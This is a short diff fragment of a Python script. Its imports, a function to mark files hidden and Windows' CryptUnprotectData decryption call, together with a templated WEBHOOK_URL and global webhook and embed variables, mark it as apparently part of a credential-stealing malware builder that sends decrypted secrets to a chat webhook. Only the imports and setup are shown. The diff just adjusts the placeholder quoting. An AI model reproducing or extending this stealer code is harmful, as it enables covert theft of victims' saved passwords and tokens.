@@ -30,7 +30,7 @@ from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = ""&WEBHOOK_URL&""
+WEBHOOK_URL = "&WEBHOOK_URL&"
 
 def main(webhook_url):
 	global webhook, embed
